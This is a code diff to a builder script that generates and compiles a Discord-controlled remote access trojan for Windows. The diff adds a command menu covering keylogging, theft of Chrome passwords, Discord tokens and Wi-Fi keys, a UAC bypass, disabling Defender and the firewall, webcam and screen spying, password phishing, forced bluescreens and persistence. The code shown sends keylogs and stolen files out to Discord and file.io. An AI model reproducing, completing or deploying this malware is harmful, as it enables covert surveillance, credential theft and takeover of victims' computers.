@@ -27,23 +27,82 @@ def discordrat():
 
     try:
         with open(f"temp/{fileName}.py", "w") as file:
-            file.write("""import winreg
-import ctypes
-import sys
-import os
-import ssl
-import random
-import threading
-import time
-import cv2
-import subprocess
-import discord
+            file.write("""import winreg, ctypes, asyncio, discord, sys, os, ssl, random, threading, time, cv2, subprocess, discord
+
+helpmenu = """+'"""'+"""
+
+Availaible commands are :
+
+--> !message = Show a message box displaying your text / Syntax  = "!message example"
+--> !shell = Execute a shell command /Syntax  = "!shell whoami"
+--> !webcampic = Take a picture from the webcam
+--> !windowstart = Start logging current user window (logging is shown in the bot activity)
+--> !windowstop = Stop logging current user window 
+--> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
+--> !admincheck = Check if program has admin privileges
+--> !sysinfo = Gives info about infected computer
+--> !history = Get chrome browser history
+--> !download = Download a file from infected computer
+--> !upload = Upload file to the infected computer / Syntax = "!upload file.png" (with attachment)
+--> !cd = Changes directory
+--> !delete = deletes a file / Syntax = "!delete /path to/the/file.txt"
+--> !write = Type your desired sentence on computer / Type "enter" to press the enter button on the computer
+--> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)
+--> !clipboard = Retrieve infected computer clipboard content
+--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
+--> !startkeylogger = Starts a keylogger
+--> !stopkeylogger = Stops keylogger
+--> !dumpkeylogger = Dumps the keylog
+--> !volumemax = Put volume to max
+--> !volumezero = Put volume at 0
+--> !idletime = Get the idle time of user's on target computer
+--> !blockinput = Blocks user's keyboard and mouse / Warning : Admin rights are required
+--> !unblockinput = Unblocks user's keyboard and mouse / Warning : Admin rights are required
+--> !screenshot = Get the screenshot of the user's current screen
+--> !exit = Exit program
+--> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"
+--> !uacbypass = attempt to bypass uac to gain admin by using fod helper
+--> !passwords = grab all chrome passwords
+--> !streamwebcam = streams webcam by sending multiple pictures
+--> !stopwebcam = stop webcam stream
+--> !getdiscordinfo = get discord token,email,phone number,etc
+--> !streamscreen = stream screen by sending multiple pictures
+--> !stopscreen = stop screen stream
+--> !shutdown = shutdown computer
+--> !restart = restart computer
+--> !logoff = log off current user
+--> !bluescreen = BlueScreen PC
+--> !displaydir = display all items in current dir
+--> !currentdir = display the current dir
+--> !dateandtime = display system date and time
+--> !prockill = kill a process by name / syntax = "!kill process.exe"
+--> !recscreen = record screen for certain amount of time / syntax = "!recscreen 10"
+--> !reccam = record camera for certain amount of time / syntax = "!reccam 10"
+--> !recaudio = record audio for certain amount of time / syntax = "!recaudio 10"
+--> !disableantivirus = permanently disable windows defender(requires admin)
+--> !disablefirewall = disable windows firewall (requires admin)
+--> !audio = play a audio file on the target computer(.wav only) / Syntax = "!audio" (with attachment)
+--> !selfdestruct = delete all traces that this program was on the target PC
+--> !windowspass = attempt to phish password by poping up a password dialog
+--> !displayoff = turn off the monitor(Admin rights are required)
+--> !displayon = turn on the monitors(Admin rights are required)
+--> !hide = hide the file by changing the attribute to hidden
+--> !unhide = unhide the file the removing the attribute to make it unhidden
+--> !ejectcd = eject the cd drive on computer
+--> !retractcd = retract the cd drive on the computer
+--> !critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)
+--> !uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)
+--> !website = open a website on the infected computer / syntax = "!website google.com" or "!website www.google.com"
+--> !distaskmgr = disable task manager(Admin rights are required)
+--> !enbtaskmgr = enable task manager(if disabled)(Admin rights are required)
+--> !getwifipass = get all the wifi passwords on the current device(Admin rights are required)
+--> !startup = add file to startup(when computer go on this file starts)(Admin rights are required)
+"""+'"""'+"""
+
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from discord.ext import commands
 from ctypes import *
-import asyncio
-import discord
 from discord import utils
 token = '~~TOKENHERE~~'
 global appdata
@@ -59,7 +118,7 @@ async def activity(client):
         if stop_threads:
             break
         current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
-        window_displayer = discord.Game(f"Visiting: {{current_window}}")
+        window_displayer = discord.Game(f"Visiting: {current_window}")
         await client.change_presence(status=discord.Status.online, activity=window_displayer)
         time.sleep(1)
 def between_callback(client):
@@ -97,14 +156,14 @@ async def on_ready():
         channel_name = "session-1"
         newchannel = await client.guilds[0].create_text_channel(channel_name)
     else:
-        channel_name = f"session-{{number}}"
+        channel_name = f"session-{number}"
         newchannel = await client.guilds[0].create_text_channel(channel_name)
     channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
     channel = client.get_channel(channel_.id)
     is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-    value1 = f"@here :white_check_mark: New session opened {{channel_name}} | {{platform.system()}} {{platform.release()}} |  :flag_{{flag.lower()}}: | User : {{os.getlogin()}}"
+    value1 = f"@here :white_check_mark: New session opened {channel_name} | {platform.system()} {platform.release()} |  :flag_{flag.lower()}: | User : {os.getlogin()}"
     if is_admin == True:
-        await channel.send(f'{{value1}} | admin!')
+        await channel.send(f'{value1} | admin!')
     elif is_admin == False:
         await channel.send(value1)
     game = discord.Game(f"Window logging stopped")
@@ -149,16 +208,16 @@ async def on_message(message):
                 else:
                     channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
                     await channel_to_delete.delete()
-                    await message.channel.send(f"[*] {{message.content[6:]}} killed.")
+                    await message.channel.send(f"[*] {message.content[6:]} killed.")
             except:
-                await message.channel.send(f"[!] {{message.content[6:]}} is invalid,please enter a valid session name")
+                await message.channel.send(f"[!] {message.content[6:]} is invalid,please enter a valid session name")
         if message.content == "!dumpkeylogger":
             import os
             temp = os.getenv("TEMP")
             file_keys = temp + r"\key_log.txt"
             file = discord.File(file_keys, filename="key_log.txt")
             await message.channel.send("[*] Command successfuly executed", file=file)
-            os.popen(f"del {{file_keys}}")
+            os.popen(f"del {file_keys}")
         if message.content == "!exit":
             import sys
             uncritproc()
@@ -287,7 +346,7 @@ async def on_message(message):
             if check2 > 7340032:
                 import requests
                 await message.channel.send("this may take some time becuase it is over 8 MB. please wait")
-                response = requests.post('https://file.io/', files={{"file": open(filename, "rb")}}).json()["link"]
+                response = requests.post('https://file.io/', files={"file": open(filename, "rb")}).json()["link"]
                 await message.channel.send("download link: " + response)
                 await message.channel.send("[*] Command successfuly executed")
             else:
@@ -1251,6 +1310,8 @@ client.run(token)""".replace("~~TOKENHERE~~", tokenbot))
         os.system('cls')
         print(f'{y}[{b}#{y}]{w} File creation...')
         time.sleep(1)
+        # Note! There is an issue with this, see https://github.com/opencv/opencv/issues/14064 if you cannot compile the exe
+        # To fix this, add --paths to the pyinstaller command, and point to Python39\site-packages\cv2\python-3.9
         os.system(f"pyinstaller -y -F -w --distpath temp --specpath temp --workpath temp temp/{fileName}.py")
         os.system('cls')
         print(f'{y}[{b}#{y}]{w} Cleaning up old files...')
